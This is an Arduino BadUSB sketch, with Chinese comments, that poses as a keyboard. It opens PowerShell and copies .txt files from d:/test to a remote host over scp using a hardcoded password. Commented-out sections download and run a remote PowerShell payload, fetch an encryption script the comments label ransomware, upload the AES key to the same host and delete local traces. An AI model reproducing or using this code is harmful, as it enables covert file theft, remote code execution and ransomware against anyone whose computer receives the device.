#include <Keyboard.h>
void setup() {
  Keyboard.begin();
  delay(3000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键
  delay(500);
  Keyboard.press('r');//r键
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500);
  Keyboard.println("powershell");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(2000);
  //文件窃取
  Keyboard.print("scp d:/test/*.");
  Keyboard.print("txt badusb@118.178.229.36:/badusb/uploads");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(3500);
  Keyboard.println("ljjyyds");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  //先进入D盘文件夹
//  Keyboard.println("d:");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.release(KEY_RETURN);
//  delay(1000);
//  Keyboard.println("mkdir 1TEST");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.release(KEY_RETURN);
//  delay(1000);
//  Keyboard.println("cd 1TEST");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.release(KEY_RETURN);
//  delay(1000);
  //远程主控：将下载的payload.txt后缀改为ps1，并运行payload.ps1
//  //Keyboard.println("iex(new-object net.webclient).downloadstring('http://118.178.229.36:9888/uploads/payload.ps1')");
  //下载文件
//  Keyboard.println("iNVOKE-wEBrEQUEST -uRI 'HTTP://118.178.229.36:9888/UPLOADS/PAYLOAD.TXT' -oUTfILE 'PAYLOAD.TXT'");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.release(KEY_RETURN);
//  delay(3000);
//  //重命名为payload.ps1
//  Keyboard.println("rENAME-iTEM -pATH 'PAYLOAD.TXT' -nEWnAME 'PAYLOAD.PS1'");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.release(KEY_RETURN);
//  delay(1000);
//  //运行payload.ps1
//  Keyboard.println("./PAYLOAD.PS1");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.release(KEY_RETURN);
//  delay(3000);
  //实现文件加密：勒索
//  Keyboard.println("Invoke-WebRequest -Uri 'http://118.178.229.36:9888/uploads/encrypt.ps1' -OutFile 'encrypt.ps1'");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.release(KEY_RETURN);
//  delay(3000);
//  //Keyboard.println("curl -F "file=@aes.txt" http://118.178.229.36:9888/upload");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.release(KEY_RETURN);
//  delay(3000);
  //删除本地的aes.txt和encrypt.ps1文件
//  Keyboard.println("Remove-Item -Path 'aes.txt'");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.release(KEY_RETURN);
//  delay(1000);
//  Keyboard.println("Remove-Item -Path 'encrypt.ps1'");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.release(KEY_RETURN);
//  delay(1000);
  //退出
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯
}

void loop() {

}
